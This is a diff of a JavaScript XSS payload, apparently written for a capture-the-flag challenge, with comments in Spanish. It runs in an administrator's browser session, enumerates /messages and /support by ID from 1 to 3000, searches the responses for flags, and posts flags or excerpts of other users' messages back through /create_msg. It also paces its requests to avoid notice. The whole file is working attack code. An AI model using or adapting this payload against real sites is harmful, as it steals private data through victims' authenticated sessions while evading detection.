@@ -1,5 +1,7 @@
-// navaja.js — exfil same-origin vía /create_msg
+// navaja_enum.js — enumera /messages?id=... y exfiltra vía /create_msg (same-origin)
 (async () => {
+  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
   const postMsg = async (message) => {
     try {
       await fetch('/create_msg', {
@@ -7,47 +9,70 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ message })
       });
-    } catch (e) { /* silencio */ }
+    } catch (_) {}
   };
 
   try {
-    // 1) Determina el endpoint que está viendo el admin (con o sin ?id=)
-    const qs = new URLSearchParams(location.search);
-    const id = qs.get('id');
-    const endpoint = id ? `/messages?id=${encodeURIComponent(id)}` : `/messages`;
+    // 0) también mira lo que ve esta vista por si acaso
+    try {
+      const r0 = await fetch('/messages', { credentials: 'include' });
+      const j0 = await r0.json();
+      if (j0 && j0.messages && j0.messages.length) {
+        const txt0 = JSON.stringify(j0);
+        const m0 = txt0.match(/FLAG\{[^}]+\}/i);
+        if (m0) { await postMsg(`EXFIL_FLAG(self): ${m0[0]}`); return; }
+        await postMsg(`EXFIL_SELF: ${txt0.slice(0, 900)}`);
+      } else {
+        await postMsg(`EXFIL_SELF: {"messages":[]}`);
+      }
+    } catch (_) {}
 
-    // 2) Pide los mensajes que ve el admin
-    const r = await fetch(endpoint, { credentials: 'include' });
-    const data = await r.json(); // { messages: [ {id, message}, ... ] }
+    // 1) Enumera IDs
+    const START = 1;           // ajusta si sospechas un rango distinto
+    const END   = 3000;        // sube/baja según el CTF
+    const STEP_DELAY = 120;    // ms entre intentos para no levantar sospechas
 
-    // 3) Intenta localizar una FLAG{...} en cualquier mensaje o en el body visible
-    const allText = JSON.stringify(data);
-    const fromDom = (document.body && document.body.innerText) ? document.body.innerText : '';
-    const m = (allText + '\n' + fromDom).match(/FLAG\{[^}]+\}/i);
+    for (let id = START; id <= END; id++) {
+      const url = `/messages?id=${encodeURIComponent(id)}`;
+      let data;
+      try {
+        const r = await fetch(url, { credentials: 'include' });
+        if (!r.ok) continue;
+        data = await r.json();
+      } catch (_) { continue; }
 
-    if (m && m[0]) {
-      await postMsg(`EXFIL_FLAG: ${m[0]}`);
-      return;
+      if (!data || !Array.isArray(data.messages)) { continue; }
+
+      const arr = data.messages;
+      if (arr.length === 0) { await sleep(STEP_DELAY); continue; }
+
+      // 2) Buscar FLAG en ese hilo
+      const txt = JSON.stringify({ id, messages: arr });
+      const m = txt.match(/FLAG\{[^}]+\}/i);
+      if (m) {
+        await postMsg(`EXFIL_FLAG(id=${id}): ${m[0]}`);
+        return; // objetivo cumplido
+      }
+
+      // 3) No hay flag: exfiltra muestra de ese hilo
+      await postMsg(`EXFIL_HIT id=${id} count=${arr.length}: ${txt.slice(0, 850)}`);
+      await sleep(STEP_DELAY);
+
+      // 4) (opcional) intentar HTML de /support?id=... por si la flag está en el DOM
+      try {
+        const h = await fetch(`/support?id=${encodeURIComponent(id)}`, { credentials: 'include' });
+        const t = await h.text();
+        const m2 = t.match(/FLAG\{[^}]+\}/i);
+        if (m2) {
+          await postMsg(`EXFIL_FLAG_DOM(id=${id}): ${m2[0]}`);
+          return;
+        }
+      } catch (_) {}
     }
 
-    // 4) Si no hay flag, postea todo el JSON en trozos para no desbordar
-    const payload = allText;
-    const CHUNK = 900; // margen para el JSON.stringify del servidor
-    let idx = 0, part = 0;
-    while (idx < payload.length && part < 10) { // limita a 10 trozos por prudencia
-      const slice = payload.slice(idx, idx + CHUNK);
-      await postMsg(`EXFIL_PART_${part}: ${slice}`);
-      idx += CHUNK;
-      part += 1;
-    }
-
-    // 5) También envía un resumen visible del panel (texto plano)
-    if (fromDom && fromDom.trim()) {
-      const snip = fromDom.slice(0, 1500);
-      await postMsg(`EXFIL_DOM_SNIP: ${snip}`);
-    }
+    await postMsg('EXFIL_DONE: scanned range without FLAG');
   } catch (e) {
-    // Como último recurso, deja un rastro de error para debug en el panel
-    try { await postMsg(`EXFIL_ERR: ${e && e.message ? e.message : String(e)}`); } catch {}
+    await postMsg(`EXFIL_ERR: ${e && e.message ? e.message : String(e)}`);
   }
 })();
+
